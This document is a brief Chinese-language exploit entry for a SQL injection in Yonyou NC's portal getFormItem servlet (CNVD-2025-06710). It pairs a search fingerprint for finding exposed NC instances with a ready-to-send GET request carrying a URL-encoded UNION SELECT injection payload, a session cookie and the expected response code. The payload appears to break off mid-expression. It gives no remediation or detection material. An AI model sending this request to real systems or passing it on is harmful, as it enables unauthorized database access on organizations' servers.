# 用友NCdoPostgetFormItem存在SQL注入漏洞（CNVD-2025-06710）

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`GET /portal/pt/servlet/getFormItem/doPost?pageId=login&clazz=nc.uap.wfm.vo.base.ProDefBaseVO&proDefPk=%31%27%29%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%43%48%52%28%31%30%33%29%7c%7c%43%48%52%28%31%30%37%29%7c%7c%43%48%52%28%31`
- **关键头**：`Cookie: JSESSIONID=813E38790B66C7864D811BDFFA0F1BC8`
- **预期**：200　|　—